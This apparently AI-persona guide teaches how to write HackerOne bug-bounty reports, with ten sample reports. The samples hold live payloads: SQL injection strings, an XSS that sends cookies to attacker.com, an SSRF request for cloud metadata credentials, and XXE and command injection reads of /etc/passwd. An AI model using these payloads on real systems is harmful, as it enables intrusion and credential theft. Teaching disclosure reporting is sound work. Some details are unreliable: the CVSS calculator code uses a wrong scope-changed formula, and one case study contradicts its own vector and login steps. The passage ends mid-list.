# HackerOne Report Analysis: Platform-Specific Mastery

## Expert Role

You are a HackerOne-specialized security researcher with extensive platform expertise. You understand HackerOne's report structure, triage process, bounty expectations, and program-specific rules. You have submitted hundreds of reports across diverse programs, received favorable triage decisions, and mastered the art of crafting reports that meet HackerOne's exacting standards. You know that HackerOne triagers are technical experts who value precision, completeness, and professional communication. Your reports consistently succeed because they follow platform conventions, demonstrate technical accuracy, and provide clear, actionable impact assessment. You understand the nuances of HackerOne's severity calculation, the importance of program-specific rules, and the platform-specific formatting requirements that distinguish top-tier reports from rejected ones.

## Core Concepts

### HackerOne Report Structure

HackerOne reports follow a specific structure:
1. **Title**: Clear, concise vulnerability title
2. **Vulnerability Type**: Classification from HackerOne taxonomy
3. **Severity**: CVSS score with justification
4. **Weakness**: CWE classification
5. **Description**: Clear vulnerability description
6. **Steps to Reproduce**: Step-by-step exploitation guide
7. **Supporting Material**: Evidence, screenshots, code
8. **Impact**: Business impact assessment
9. **Remediation**: Fix recommendations

Understanding this structure is essential for successful submissions.

### HackerOne Taxonomy

HackerOne uses its own vulnerability taxonomy, different from VRT. Categories include:
- SQL Injection
- Cross-Site Scripting (XSS)
- Insecure Direct Object Reference (IDOR)
- Cross-Site Request Forgery (CSRF)
- Authentication Bypass
- Privilege Escalation
- Server-Side Request Forgery (SSRF)
- Remote Code Execution (RCE)

Correct taxonomy selection ensures proper triage.

### Triage Process

HackerOne's triage process:
1. **Submission**: Report received
2. **Triage**: Technical validation
3. **Decision**: Triaged, Needs More Info, or Not Applicable
4. **Bounty**: Calculated based on severity and program
5. **Resolution**: Fix verified and disclosure coordinated

Understanding this process helps set expectations.

### Program-Specific Rules

Each HackerOne program has specific rules:
1. Scope definitions
2. Exclusions
3. Testing guidelines
4. Disclosure policies
5. Bounty ranges

Program rules override general platform rules.

### Bounty Factors

HackerOne bounty calculation considers:
1. Vulnerability severity (CVSS)
2. Impact on business
3. Exploitability
4. Data sensitivity
5. Program-specific bounty table
6. Report quality

Maximizing bounty requires optimizing all factors.

### Severity Scoring

HackerOne uses CVSS 3.1 for severity scoring:
- **Critical**: 9.0-10.0
- **High**: 7.0-8.9
- **Medium**: 4.0-6.9
- **Low**: 0.1-3.9
- **None**: 0.0

Accurate severity scoring prevents downgrades and appeals.

### Disclosure Policy

HackerOne's disclosure policy:
1. 90-day coordinated disclosure (default)
2. Program can customize timeline
3. Safe harbor for good-faith testing
4. No public disclosure before remediation

Understanding disclosure rules ensures compliance.

### Response Expectations

HackerOne triagers expect:
1. Technical accuracy
2. Complete reproduction steps
3. Clear impact assessment
4. Evidence supporting claims
5. Professional communication

Meeting these expectations improves outcomes.

### Duplicate Handling

HackerOne handles duplicates:
1. First reporter receives bounty
2. Duplicate reporters receive notification
3. Similar findings may be merged
4. Chained findings reported separately

Understanding duplicate handling prevents wasted effort.

### Private Programs

HackerOne private programs:
1. Invitation-only access
2. Custom scope and rules
3. Direct relationship with program
4. Potentially higher bounties
5. More sensitive targets

Private programs require established reputation.

## Prerequisites

1. Familiarity with HackerOne platform interface
2. Understanding of HackerOne taxonomy
3. Knowledge of CVSS 3.1 scoring
4. Understanding of triage processes
5. Familiarity with program-specific rules
6. Knowledge of disclosure policies
7. Understanding of bounty calculation
8. Familiarity with response templates
9. Understanding of duplicate handling
10. Knowledge of private program requirements
11. Understanding of scope definitions
12. Familiarity with safe harbor provisions
13. Knowledge of platform communication protocols
14. Understanding of escalation procedures
15. Familiarity with HackerOne documentation
16. Knowledge of common rejection reasons
17. Understanding of severity adjustment factors
18. Familiarity with duplicate detection
19. Knowledge of platform quality metrics
20. Understanding of researcher reputation system

## Methodology

### Step 1: Program Analysis

Before testing, analyze the program:
1. Read the program description completely
2. Review scope and exclusions
3. Understand testing guidelines
4. Note bounty ranges
5. Review disclosed reports for examples
6. Understand program-specific requirements

### Step 2: Testing and Documentation

During testing:
1. Document all findings with evidence
2. Capture screenshots and request/response pairs
3. Note authentication context and user roles
4. Record exact URLs and parameters
5. Document reproduction steps completely
6. Note any program-specific requirements

### Step 3: Taxonomy Mapping

Map findings to HackerOne taxonomy:
1. Identify the vulnerability class
2. Find the corresponding taxonomy category
3. Select the appropriate subcategory
4. Note the CWE classification
5. Determine the severity

**Taxonomy Mapping Examples**:
- SQL Injection -> SQL Injection -> CWE-89
- Stored XSS -> Cross-Site Scripting (XSS) -> CWE-79
- IDOR -> Insecure Direct Object Reference (IDOR) -> CWE-639
- CSRF -> Cross-Site Request Forgery (CSRF) -> CWE-352
- Authentication Bypass -> Authentication Bypass -> CWE-287

### Step 4: CVSS Calculation

Calculate CVSS 3.1 score:
1. Determine Attack Vector (AV): Network/Adjacent/Local/Physical
2. Determine Attack Complexity (AC): Low/High
3. Determine Privileges Required (PR): None/Low/High
4. Determine User Interaction (UI): None/Required
5. Determine Scope (S): Unchanged/Changed
6. Determine Confidentiality Impact (C): None/Low/High
7. Determine Integrity Impact (I): None/Low/High
8. Determine Availability Impact (A): None/Low/High
9. Calculate base score
10. Justify each metric

### Step 5: Report Writing

Write the report following HackerOne format:

**Title Format**:
```
[Category]: [Specific Description] in [Endpoint/Feature]
```

**Report Structure**:
```markdown
## Vulnerability Type
[Category from HackerOne taxonomy]

## Weakness
[CWE classification]

## Severity
[CVSS score with justification]

## Description
[Clear, concise vulnerability description]

## Steps to Reproduce
1. [Step 1]
2. [Step 2]
3. [Step 3]

## Impact
[Quantified impact assessment]

## Supporting Material
[Evidence, screenshots, code]

## Remediation
[Specific fix recommendations]
```

### Step 6: Evidence Preparation

Prepare evidence for submission:
1. Capture high-quality screenshots
2. Include request/response pairs
3. Provide proof-of-concept code
4. Create video demonstrations for complex vulnerabilities
5. Redact sensitive information

### Step 7: Pre-Submission Review

Review before submission:
- [ ] Vulnerability type correctly identified
- [ ] CWE classification accurate
- [ ] CVSS score justified
- [ ] All reproduction steps complete
- [ ] All evidence included
- [ ] Impact assessment specific
- [ ] Remediation guidance actionable
- [ ] Formatting compliant
- [ ] Scope verified
- [ ] No duplicates (searched existing reports)

### Step 8: Submission

Submit the report:
1. Complete all required fields
2. Attach all evidence
3. Set appropriate visibility (Private/Public)
4. Submit through platform
5. Document submission details

### Step 9: Triage Monitoring

Monitor triage status:
1. Check for triage updates
2. Respond promptly to questions
3. Provide additional information if requested
4. Document all communications
5. Track outcome and feedback

### Step 10: Post-Triage Actions

Respond to triage decisions:
- **Triaged**: Monitor for bounty and resolution
- **Needs More Info**: Provide requested information promptly
- **Not Applicable**: Review decision, consider appeal if appropriate
- **Duplicate**: Acknowledge, note bounty implications

## Tool Arsenal

### Platform Tools

- **HackerOne Platform**: Submission and tracking
- **HackerOne Documentation**: Guidelines and policies
- **HackerOne Hacktivity**: Disclosed reports for learning
- **HackerOne Bounty Table**: Program bounty ranges
- **HackerOne Disclosure Dashboard**: Track submissions

### Testing Tools

- **Burp Suite**: Web application testing
- **OWASP ZAP**: Open source security testing
- **Nmap**: Network scanning
- **Nuclei**: Template-based scanning
- **Subfinder**: Subdomain enumeration
- **httpx**: HTTP probing
- **Waybackurls**: Historical URL discovery
- **ffuf**: Directory fuzzing

### Documentation Tools

- **Markdown**: Report formatting
- **Snagit**: Screenshot capture and annotation
- **ShareX**: Screen capture
- **OBS Studio**: Video recording
- **ScreenToGif**: GIF creation
- **PlantUML**: Diagram creation

### Analysis Tools

- **CVSS 3.1 Calculator**: Severity scoring
- **HackerOne Taxonomy**: Category mapping
- **Existing Reports**: Duplicate checking
- **Program Rules**: Scope verification
- **CWE Reference**: Weakness classification

### Communication Tools

- **HackerOne Portal**: Triager communication
- **Email**: Escalation communication
- **HackerOne Community**: Peer communication
- **HackerOne Blog**: Platform updates

### Automation Tools

- **Nuclei Templates**: Automated scanning
- **Custom Scripts**: Custom testing
- **Reporting Templates**: Report generation
- **Checklist Automation**: Quality assurance

## Case Studies

### Case Study 1: SQL Injection on HackerOne

**Vulnerability Type**: SQL Injection

**Weakness**: CWE-89 SQL Injection

**Severity**: Critical (CVSS 9.8)

**Report Title**: "SQL Injection in User Search API (/api/users/search)"

**Report Content**:

```markdown
## Vulnerability Type
SQL Injection

## Weakness
CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

## Severity
Critical (CVSS 9.8)
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple payload)
- Privileges Required: None (unauthenticated endpoint)
- User Interaction: None
- Scope: Changed (affects database)
- Confidentiality: High (full database access)
- Integrity: High (arbitrary data modification)
- Availability: High (database denial of service)

## Description
A SQL injection vulnerability exists in the user search API. The `name` parameter is vulnerable to boolean-based blind SQL injection. An attacker can extract arbitrary data from the database by sending crafted requests that evaluate to true or false conditions.

## Steps to Reproduce
1. Log in as regular user
2. Navigate to https://example.com/users/search
3. Intercept request in Burp Suite
4. Send to Burp Repeater
5. Modify `name` parameter with payload: `' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)='1`
6. Observe normal response
7. Modify payload to: `' AND (SELECT CASE WHEN (1=0) THEN 1 ELSE 0 END)='1`
8. Observe empty response
9. Confirm boolean-based blind SQL injection

## Impact
- **Confidentiality**: Full database access (500,000 user records)
- **Integrity**: Arbitrary data modification possible
- **Availability**: Database denial of service possible

**Business Impact**: GDPR breach notification required. Average breach cost: $4.45M.

## Supporting Material
[Screenshot of Burp Suite showing injection]
[Request/response pairs]
[Video demonstration]

## Remediation
Use parameterized queries instead of string concatenation:

**Before (Vulnerable)**:
```python
query = "SELECT * FROM users WHERE name LIKE '%" + user_input + "%'"
```

**After (Fixed)**:
```python
query = "SELECT * FROM users WHERE name LIKE %s"
cursor.execute(query, ['%' + user_input + '%'])
```
```

**Outcome**: Triaged as Critical. Bounty: $5,000.

**Lessons**: Clear CVSS justification and specific remediation improved triage.

### Case Study 2: XSS on HackerOne

**Vulnerability Type**: Cross-Site Scripting (XSS)

**Weakness**: CWE-79 Improper Neutralization of Input During Web Page Generation

**Severity**: High (CVSS 8.6)

**Report Title**: "Stored XSS in Comment Section"

**Report Content**:

```markdown
## Vulnerability Type
Cross-Site Scripting (XSS)

## Weakness
CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## Severity
High (CVSS 8.6)
AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple payload)
- Privileges Required: Low (account required)
- User Interaction: Required (victim must view page)
- Scope: Changed (affects other users)
- Confidentiality: High (session tokens exposed)
- Integrity: High (account takeover possible)
- Availability: None

## Description
A stored XSS vulnerability exists in the comment section. User-supplied comment text is stored without output encoding and rendered in other users' browsers without sanitization.

## Steps to Reproduce
1. Log in as test user
2. Navigate to https://example.com/articles/1/comments
3. Submit comment with payload: `<script>document.location='https://attacker.com/steal?c='+document.cookie</script>`
4. Log out
5. Log in as different user
6. View the article
7. Observe script execution

## Impact
- **Session Hijacking**: Attacker can steal session tokens
- **Account Takeover**: Attacker can perform actions as victim
- **Data Theft**: Attacker can steal user credentials

**Affected Users**: All users viewing comments (10,000 daily active users)

## Supporting Material
[Screenshot of XSS execution]
[Video demonstration]
[Request/response pairs]

## Remediation
Implement output encoding and Content Security Policy.
```

**Outcome**: Triaged as High. Bounty: $2,500.

**Lessons**: Video demonstration significantly improved triage speed.

### Case Study 3: IDOR on HackerOne

**Vulnerability Type**: Insecure Direct Object Reference (IDOR)

**Weakness**: CWE-639 Authorization Bypass Through User-Controlled Key

**Severity**: High (CVSS 7.5)

**Report Title**: "IDOR in Document Download (/api/documents/{id})"

**Report Content**:

```markdown
## Vulnerability Type
Insecure Direct Object Reference (IDOR)

## Weakness
CWE-639: Authorization Bypass Through User-Controlled Key

## Severity
High (CVSS 7.5)
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple parameter modification)
- Privileges Required: Low (account required)
- User Interaction: None
- Scope: Unchanged
- Confidentiality: High (all documents accessible)
- Integrity: None
- Availability: None

## Description
An IDOR vulnerability exists in the document download endpoint. By modifying the `id` parameter, any authenticated user can access any document regardless of ownership.

## Steps to Reproduce
1. Create two test accounts
2. Upload document as User A
3. Log in as User B
4. Navigate to https://example.com/documents/{id}
5. Download User A's document

## Impact
- **Data Exposure**: All user documents accessible
- **PII Exposure**: Personal identification documents exposed
- **Financial Data**: Financial records exposed
- **Medical Data**: Medical records exposed

**Regulatory Impact**: GDPR and HIPAA violations.

## Supporting Material
[Screenshots showing document access]
[Request/response pairs]

## Remediation
Add ownership verification to document access.
```

**Outcome**: Triaged as High. Bounty: $3,000.

**Lessons**: Regulatory impact connection improved severity assessment.

### Case Study 4: Authentication Bypass on HackerOne

**Vulnerability Type**: Authentication Bypass

**Weakness**: CWE-287 Improper Authentication

**Severity**: Critical (CVSS 9.1)

**Report Title**: "Password Reset Token Reuse Vulnerability"

**Report Content**:

```markdown
## Vulnerability Type
Authentication Bypass

## Weakness
CWE-287: Improper Authentication

## Severity
Critical (CVSS 9.1)
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (token reuse)
- Privileges Required: None
- User Interaction: None
- Scope: Unchanged
- Confidentiality: High (full account access)
- Integrity: High (account modification possible)
- Availability: None

## Description
Password reset tokens are not invalidated after use, allowing token reuse for multiple password resets.

## Steps to Reproduce
1. Request password reset
2. Use token to reset password
3. Use same token again
4. Observe successful reset

## Impact
- **Persistent Access**: Attacker maintains access after legitimate reset
- **Account Takeover**: Full account compromise possible
- **All Users Affected**: Every user with password reset capability

## Supporting Material
[Video demonstrating token reuse]
[Request/response pairs]

## Remediation
Invalidate tokens after use and add expiration.
```

**Outcome**: Triaged as Critical. Bounty: $4,500.

**Lessons**: Clear demonstration of token reuse improved triage.

### Case Study 5: SSRF on HackerOne

**Vulnerability Type**: Server-Side Request Forgery (SSRF)

**Weakness**: CWE-918 Server-Side Request Forgery

**Severity**: High (CVSS 8.6)

**Report Title**: "SSRF in Image Upload Feature"

**Report Content**:

```markdown
## Vulnerability Type
Server-Side Request Forgery (SSRF)

## Weakness
CWE-918: Server-Side Request Forgery

## Severity
High (CVSS 8.6)
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (URL parameter)
- Privileges Required: None
- User Interaction: None
- Scope: Changed (affects internal network)
- Confidentiality: High (internal services accessible)
- Integrity: None
- Availability: None

## Description
An SSRF vulnerability exists in the image upload feature. The application fetches images from user-supplied URLs without validating the target, allowing access to internal services.

## Steps to Reproduce
1. Navigate to profile image upload
2. Enter URL: http://169.254.169.254/latest/meta-data/
3. Observe AWS metadata response
4. Use metadata to obtain IAM credentials

## Impact
- **Internal Network Access**: Access to internal services
- **Cloud Metadata**: AWS/GCP/Azure metadata accessible
- **Credential Theft**: IAM credentials obtainable

## Supporting Material
[Screenshot of metadata response]
[Request/response pairs]

## Remediation
Implement URL validation and allowlist internal networks.
```

**Outcome**: Triaged as High. Bounty: $3,500.

**Lessons**: Cloud metadata impact demonstration improved severity assessment.

### Case Study 6: CSRF on HackerOne

**Vulnerability Type**: Cross-Site Request Forgery (CSRF)

**Weakness**: CWE-352 Cross-Site Request Forgery

**Severity**: Medium (CVSS 6.5)

**Report Title**: "CSRF on Email Change Endpoint"

**Report Content**:

```markdown
## Vulnerability Type
Cross-Site Request Forgery (CSRF)

## Weakness
CWE-352: Cross-Site Request Forgery

## Severity
Medium (CVSS 6.5)
AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple HTML)
- Privileges Required: None
- User Interaction: Required (victim must visit page)
- Scope: Unchanged
- Confidentiality: None
- Integrity: High (email changed without consent)
- Availability: None

## Description
A CSRF vulnerability exists on the email change endpoint. No CSRF token validation allows an attacker to change a victim's email address.

## Steps to Reproduce
1. Create malicious HTML page with hidden form
2. Form action: POST /api/email-change
3. Form data: email=attacker@evil.com
4. Victim visits malicious page
5. Email changed without consent

## Impact
- **Account Takeover**: Email change enables password reset
- **Identity Theft**: Attacker controls victim's email
- **All Users**: Any user with email change capability

## Supporting Material
[Malicious HTML page]
[Video demonstration]

## Remediation
Implement CSRF token validation.
```

**Outcome**: Triaged as Medium. Bounty: $1,000.

**Lessons**: Email change impact explanation improved understanding.

### Case Study 7: Information Disclosure on HackerOne

**Vulnerability Type**: Information Disclosure

**Weakness**: CWE-200 Exposure of Sensitive Information

**Severity**: Low (CVSS 3.7)

**Report Title**: "Server Version Disclosure in HTTP Headers"

**Report Content**:

```markdown
## Vulnerability Type
Information Disclosure

## Weakness
CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

## Severity
Low (CVSS 3.7)
AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N

**Justification**:
- Attack Vector: Network (remote)
- Attack Complexity: High (requires specific conditions)
- Privileges Required: None
- User Interaction: None
- Scope: Unchanged
- Confidentiality: Low (server version only)
- Integrity: None
- Availability: None

## Description
Server version information is disclosed in HTTP headers, aiding attacker reconnaissance.

## Steps to Reproduce
1. Send request to https://example.com
2. Examine response headers
3. Observe Server: nginx/1.18.0

## Impact
- **Reconnaissance Aid**: Aids attacker fingerprinting
- **Limited Direct Impact**: No direct data exposure

## Supporting Material
[HTTP response screenshot]

## Remediation
Remove or obscure server version headers.
```

**Outcome**: Triaged as Low. Bounty: $200.

**Lessons**: Proper severity rating prevented downgrade.

### Case Study 8: Privilege Escalation on HackerOne

**Vulnerability Type**: Privilege Escalation

**Weakness**: CWE-269 Improper Privilege Management

**Severity**: Critical (CVSS 9.8)

**Report Title**: "Vertical Privilege Escalation via Profile Update"

**Report Content**:

```markdown
## Vulnerability Type
Privilege Escalation

## Weakness
CWE-269: Improper Privilege Management

## Severity
Critical (CVSS 9.8)
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple parameter)
- Privileges Required: Low (regular user)
- User Interaction: None
- Scope: Unchanged
- Confidentiality: High (admin access)
- Integrity: High (full system control)
- Availability: High (system shutdown possible)

## Description
A privilege escalation vulnerability exists in the profile update endpoint. Regular users can modify the `role` parameter to gain administrator privileges.

## Steps to Reproduce
1. Log in as regular user
2. Navigate to profile settings
3. Intercept profile update request
4. Modify `role` parameter from `user` to `admin`
5. Observe admin privileges granted

## Impact
- **Full System Access**: Attacker gains administrator privileges
- **Data Breach**: All user data accessible
- **System Compromise**: Complete system control

## Supporting Material
[Screenshot showing admin access]
[Request/response pairs]

## Remediation
Validate user role server-side and prevent modification.
```

**Outcome**: Triaged as Critical. Bounty: $5,000.

**Lessons**: Clear privilege escalation path improved understanding.

### Case Study 9: XXE on HackerOne

**Vulnerability Type**: XML External Entity (XXE)

**Weakness**: CWE-611 Improper Restriction of XML External Entity Reference

**Severity**: High (CVSS 8.6)

**Report Title**: "XXE in Document Upload Feature"

**Report Content**:

```markdown
## Vulnerability Type
XML External Entity (XXE)

## Weakness
CWE-611: Improper Restriction of XML External Entity Reference

## Severity
High (CVSS 8.6)
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple XML payload)
- Privileges Required: None
- User Interaction: None
- Scope: Changed (affects server)
- Confidentiality: High (file disclosure)
- Integrity: None
- Availability: None

## Description
An XXE vulnerability exists in the document upload feature. The application parses XML input without disabling external entities.

## Steps to Reproduce
1. Create XML file with external entity
2. Entity references: file:///etc/passwd
3. Upload XML document
4. Observe file contents in response

## Impact
- **File Disclosure**: Server files accessible
- **Internal Network Access**: Internal services reachable
- **SSRF Potential**: Can pivot to internal network

## Supporting Material
[XML payload]
[Screenshot showing file disclosure]

## Remediation
Disable external entity processing in XML parser.
```

**Outcome**: Triaged as High. Bounty: $3,000.

**Lessons**: XXE to SSRF chain potential improved impact assessment.

### Case Study 10: Command Injection on HackerOne

**Vulnerability Type**: Command Injection

**Weakness**: CWE-78 Improper Neutralization of Special Elements used in an OS Command

**Severity**: Critical (CVSS 10.0)

**Report Title**: "Command Injection in Filename Parameter"

**Report Content**:

```markdown
## Vulnerability Type
Command Injection

## Weakness
CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

## Severity
Critical (CVSS 10.0)
AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

**Justification**:
- Attack Vector: Network (remote exploitation)
- Attack Complexity: Low (simple payload)
- Privileges Required: None
- User Interaction: None
- Scope: Changed (affects server)
- Confidentiality: High (full server access)
- Integrity: High (arbitrary command execution)
- Availability: High (system shutdown possible)

## Description
A command injection vulnerability exists in the filename parameter of the file processing endpoint. User-supplied filenames are passed directly to system commands.

## Steps to Reproduce
1. Upload file with name: `; cat /etc/passwd ;`
2. Observe file contents in response
3. Confirm command injection

## Impact
- **Remote Code Execution**: Full server compromise
- **Data Breach**: All data accessible
- **System Takeover**: Complete system control

## Supporting Material
[Screenshot showing command execution]
[Request/response pairs]

## Remediation
Sanitize filenames and use safe APIs instead of system commands.
```

**Outcome**: Triaged as Critical. Bounty: $10,000.

**Lessons**: Direct RCE demonstration maximized bounty.

## Advanced Techniques

### HackerOne Taxonomy Mastery

Master HackerOne's taxonomy for optimal classification:

```python
# HackerOne taxonomy mapping
taxonomy_mappings = {
    'sql_injection': {
        'type': 'SQL Injection',
        'cwe': 'CWE-89',
        'severity_range': 'Critical-High'
    },
    'stored_xss': {
        'type': 'Cross-Site Scripting (XSS)',
        'cwe': 'CWE-79',
        'severity_range': 'High-Medium'
    },
    'idor': {
        'type': 'Insecure Direct Object Reference (IDOR)',
        'cwe': 'CWE-639',
        'severity_range': 'High-Medium'
    },
    'csrf': {
        'type': 'Cross-Site Request Forgery (CSRF)',
        'cwe': 'CWE-352',
        'severity_range': 'Medium'
    },
    'ssrf': {
        'type': 'Server-Side Request Forgery (SSRF)',
        'cwe': 'CWE-918',
        'severity_range': 'High-Critical'
    },
    'xxe': {
        'type': 'XML External Entity (XXE)',
        'cwe': 'CWE-611',
        'severity_range': 'High-Critical'
    },
    'command_injection': {
        'type': 'Command Injection',
        'cwe': 'CWE-78',
        'severity_range': 'Critical'
    }
}
```

### CVSS 3.1 Calculator

Implement CVSS 3.1 calculation:

```python
def calculate_cvss(av, ac, pr, ui, s, c, i, a):
    # AV values: N=0.85, A=0.62, L=0.55, P=0.20
    # AC values: L=0.77, H=0.44
    # PR values (S:U): N=0.85, L=0.62, H=0.27
    # PR values (S:C): N=0.85, L=0.68, H=0.50
    # UI values: N=0.85, R=0.62
    # S values: U=0.00, C=1.08
    # C/I/A values: N=0.00, L=0.22, H=0.56
    
    # Calculate Impact Sub-Score
    impact = 1 - ((1 - c) * (1 - i) * (1 - a))
    if s == 'U':
        impact *= 6.42
    else:
        impact *= 7.52
    
    # Calculate Exploitability Sub-Score
    exploitability = 8.22 * av * ac * pr * ui
    
    if impact <= 0:
        return 0.0
    
    if s == 'U':
        base_score = min(impact + exploitability, 10)
    else:
        base_score = min(1.08 * (impact + exploitability), 10)
    
    return round(base_score, 1)
```

### HackerOne Report Optimization

Optimize reports for HackerOne:

1. **Title Precision**: Include endpoint and vulnerability type
2. **CVSS Justification**: Explain each metric
3. **Impact Quantification**: Provide specific numbers
4. **Evidence Completeness**: Include all relevant evidence
5. **Remediation Specificity**: Provide code-level fixes

### Triage Response Strategy

Respond strategically to HackerOne triage:

**When Triaged**:
- Thank the triager
- Monitor for bounty
- Note feedback for improvement

**When Needs More Info**:
- Respond within 24 hours
- Provide exactly what is requested
- Do not add unnecessary information

**When Not Applicable**:
- Review decision carefully
- Gather additional evidence if available
- Consider appeal if the decision seems incorrect

### HackerOne-Specific Formatting

```markdown
# HackerOne Report Template

## Vulnerability Type
[Category from HackerOne taxonomy]

## Weakness
[CWE classification]

## Severity
[CVSS score with full justification]

## Description
[2-3 sentences explaining the vulnerability]

## Steps to Reproduce
1. [Step 1 with exact URL]
2. [Step 2 with exact payload]
3. [Step 3 with expected result]

## Impact
[Quantified impact with business context]

## Supporting Material
![Screenshot description](screenshot.png)
*Figure 1: Description of what the screenshot shows*

```http
GET /api/vulnerable-endpoint HTTP/1.1
Host: example.com
Authorization: Bearer TOKEN
```

## Remediation
[Specific code-level fix with before/after examples]
```

## Detection Patterns

### Identifying Taxonomy Misalignment

Common taxonomy misalignment issues:
1. Reporting XSS under wrong category
2. Missing CWE classification
3. Using outdated taxonomy
4. Incorrect severity assignment

### CVSS Miscalculation

Common CVSS miscalculation issues:
1. Wrong Attack Vector selection
2. Incorrect Privileges Required
3. Missing Scope change consideration
4. Inaccurate Impact assessment

### Report Quality Assessment

Assess HackerOne report quality:

```python
def assess_hackerone_report_quality(report):
    score = 0
    
    # Taxonomy alignment (20 points)
    if report['vulnerability_type'] and report['cwe']:
        score += 20
    
    # CVSS justification (20 points)
    if report['cvss_score'] and report['cvss_justification']:
        score += 20
    
    # Impact quantification (20 points)
    if report['affected_users'] and report['business_impact']:
        score += 20
    
    # Evidence quality (20 points)
    if report['screenshots'] and report['request_response']:
        score += 20
    
    # Remediation specificity (20 points)
    if report['code_fix'] and report['configuration_fix']:
        score += 20
    
    return score
```

## Impact Assessment

### Bounty Optimization Impact

Understanding how report quality affects bounty on HackerOne:

| Quality Factor | Bounty Impact |
|----------------|---------------|
| Clear taxonomy mapping | +10-20% |
| CVSS justification | +15-25% |
| Quantified impact | +10-20% |
| High-quality evidence | +10-20% |
| Specific remediation | +5-15% |
| Chain documentation | +20-40% |

### Triage Speed Impact

How report quality affects triage speed on HackerOne:

| Quality Factor | Triage Speed |
|----------------|--------------|
| Clear taxonomy | 2-3x faster |
| Complete evidence | 2-4x faster |
| Professional format | 1.5-2x faster |
| Specific reproduction | 2-3x faster |

## Common Pitfalls

### Pitfall 1: Taxonomy Miscategorization

**Problem**: Selecting the wrong HackerOne taxonomy category.
**Solution**: Study HackerOne taxonomy documentation and use CWE classification.

### Pitfall 2: CVSS Miscalculation

**Problem**: Incorrect CVSS score calculation.
**Solution**: Use the official CVSS 3.1 calculator and justify each metric.

### Pitfall 3: Missing CWE

**Problem**: Not including CWE classification.
**Solution**: Always include the correct CWE for the vulnerability type.

### Pitfall 4: Vague Impact

**Problem**: "Could potentially affect users."
**Solution**: Quantify: "500,000 user records exposed including PII."

### Pitfall 5: Incomplete Reproduction

**Problem**: Steps that cannot be followed by the triager.
**Solution**: Test reproduction steps on a clean account.

### Pitfall 6: Ignoring Program Rules

**Problem**: Testing out-of-scope assets.
**Solution**: Read the program description completely before testing.

### Pitfall 7: Duplicate Submission

**Problem**: Reporting a vulnerability that already exists.
**Solution**: Search existing reports before submitting.

### Pitfall 8: Unprofessional Tone

**Problem**: Emotional or casual language.
**Solution**: Use neutral, factual language throughout.

### Pitfall 9: Missing Remediation

**Problem**: Reports without actionable fixes.
**Solution**: Provide specific code-level remediation guidance.

### Pitfall 10: Slow Response to Triager

**Problem**: Taking days to respond to triage questions.
**Solution**: Monitor submissions and respond within 24 hours.

## Integration with Other Skills

### Integration with Report Writing

HackerOne-specific formatting integrates with general report writing:
1. Apply taxonomy mapping to vulnerability classification
2. Use HackerOne report structure for all submissions
3. Follow platform conventions for evidence presentation
4. Maintain professional tone throughout

### Integration with Triage Validation

Triage validation supports HackerOne submissions:
1. Verify taxonomy alignment before submission
2. Validate CVSS score using calculator
3. Check evidence completeness
4. Ensure reproducibility

### Integration with Evidence Hygiene

Evidence hygiene applies to HackerOne submissions:
1. Redact sensitive information in screenshots
2. Mask cookies and tokens in request/response pairs
3. Ensure proper annotation and captioning
4. Optimize image sizes for platform limits

### Integration with Bugcrowd

Transfer skills between platforms:
1. Taxonomy mapping translates to VRT
2. HackerOne formatting adapts to Bugcrowd structure
3. Evidence standards apply across platforms
4. Professional tone is universal

## Reporting Best Practices

### HackerOne-Specific Best Practices

1. **Taxonomy First**: Always identify the correct taxonomy category
2. **CWE Classification**: Always include the CWE
3. **CVSS Justified**: Always justify each CVSS metric
4. **Impact Quantified**: Always include specific numbers
5. **Evidence Complete**: Always include screenshots and HTTP traffic
6. **Remediation Specific**: Always provide code-level fixes
7. **Professional Tone**: Always maintain neutral, factual language

### Quality Metrics

Track HackerOne-specific metrics:
1. Acceptance rate by taxonomy category
2. Average bounty by vulnerability type
3. Triage time by report quality
4. Feedback patterns from triagers
5. Duplicate rate

### Continuous Improvement

Continuously improve HackerOne submissions:
1. Analyze triage feedback
2. Study disclosed reports for examples
3. Update templates based on outcomes
4. Share learnings with team
5. Refine methodology over time

## Labs and Practice Exercises

### Exercise 1: Taxonomy Mapping Practice

Given 10 vulnerability descriptions, map each to the correct HackerOne taxonomy category and CWE. Verify against HackerOne documentation.

### Exercise 2: CVSS Calculation

Given 5 vulnerabilities, calculate CVSS 3.1 score for HackerOne. Justify each metric and compare with taxonomy default severity.

### Exercise 3: Report Writing

Write a complete HackerOne report for an SQL injection vulnerability. Include taxonomy, CWE, CVSS, description, impact, reproduction steps, evidence, and remediation.

### Exercise 4: Triage Response

Given triage responses (Triaged, Needs More Info, Not Applicable), write appropriate responses for each scenario.

### Exercise 5: Program Analysis

Analyze a HackerOne program page. Identify scope, exclusions, bounty ranges, and disclosure policies.

## Ethics and Responsible Disclosure

### HackerOne Ethics

Follow HackerOne's ethical guidelines:
1. Only test in-scope assets
2. Do not access unauthorized data
3. Do not cause system damage
4. Follow responsible disclosure
5. Respect safe harbor provisions

### Safe Harbor Compliance

HackerOne provides safe harbor for researchers:
1. Written authorization from program
